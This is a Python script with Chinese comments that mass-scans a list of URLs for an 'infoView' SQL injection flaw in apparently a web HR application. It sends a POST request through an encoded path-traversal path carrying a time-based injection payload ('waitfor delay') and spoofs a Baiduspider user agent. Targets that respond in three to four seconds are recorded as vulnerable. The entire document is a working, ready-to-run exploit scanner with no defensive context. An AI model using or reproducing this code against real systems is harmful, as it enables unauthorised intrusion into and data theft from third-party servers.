import requests
from urllib.parse import urlparse
import time
import urllib3
from colorama import init, Fore

# 初始化 colorama
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 读取文件中的 URL 列表
with open('1.txt', 'r') as file:
    urls = file.readlines()

vulnerable_urls = []

# 遍历每个 URL
for url in urls:
    url = url.strip()
    parsed_url = urlparse(url)

    # 构建请求路径
    post_url = f"{parsed_url.scheme}://{parsed_url.hostname}/templates/attestation/%2e./.%2e/general/info/view"

    # 构建请求头
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Host': parsed_url.hostname,  # 使用 hostname 而不是 netloc
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '40'
    }

    # 构建请求体
    payload = "kind=1&a0100=1';waitfor+delay+'0:0:3'+--"

    start_time = time.time()
    try:
        # 发送 POST 请求，设置超时为 10 秒，忽略 SSL 证书验证
        response = requests.post(post_url, headers=headers, data=payload, verify=False, timeout=10)
        end_time = time.time()

        # 计算响应时间
        response_time = end_time - start_time

        # 如果响应时间大于 3 秒小于 4 秒，则认为存在漏洞，并以红色打印出相应的 URL
        if 3 < response_time < 4:
            print(Fore.RED + f"[+]报告发现infoView注入: {url}")
            vulnerable_urls.append(url)
        else:
            print(Fore.GREEN + f"[-]貌似不存在，换个姿势尝试: {url}")

    except requests.Timeout:
        print(Fore.GREEN + f"[-]貌似不存在，换个姿势尝试: {url}")
    except requests.ConnectionError:
        print(Fore.GREEN + f"[-]貌似不存在，换个姿势尝试: {url}")
    except requests.RequestException as e:
        print(Fore.GREEN + f"[-]貌似不存在，换个姿势尝试: {url}: {e}")

# 统计存在漏洞的 URL 并输出
if vulnerable_urls:
    print("\n存在漏洞的地址:")
    for index, vulnerable_url in enumerate(vulnerable_urls, start=1):
        print(f"{index}. {vulnerable_url}")
else:
    print("\n没有发现漏洞")
